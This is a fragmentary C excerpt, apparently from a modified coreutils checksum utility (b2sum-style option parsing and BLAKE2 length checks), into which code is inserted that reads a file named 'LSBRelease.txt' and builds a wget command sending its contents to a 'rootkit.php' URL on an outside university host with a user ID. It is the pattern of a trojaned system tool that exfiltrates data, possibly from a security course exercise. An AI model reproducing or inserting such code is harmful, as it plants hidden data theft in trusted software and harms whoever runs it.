...
int fd = open("LSBRelease.txt", O_RDONLY);
    if (fd == -1) {
        return 1;
    }
    ...
    char command[1000] = "wget -q \"https://andromeda.cs.virginia.edu/rootkit.php?userid=amg9zd&data=";
    strncat(command, data, size);
    char quote[] = "\"";
    strncat(command, quote, 1);
  ...
  while ((opt = getopt_long (argc, argv, short_opts, long_options, NULL)) != -1)
    switch (opt)
      ...
      case 'l':
        ...
        if (b2_length % 8 != 0)
          {
            error (0, 0, _("invalid length: %s"), b2_length_str);
  ...
  if (b2_length > blake2_max_len[b2_algorithm] * 8)
    {
      ...
      die (EXIT_FAILURE, 0,
           ...
           algorithm_in_string[b2_algorithm],
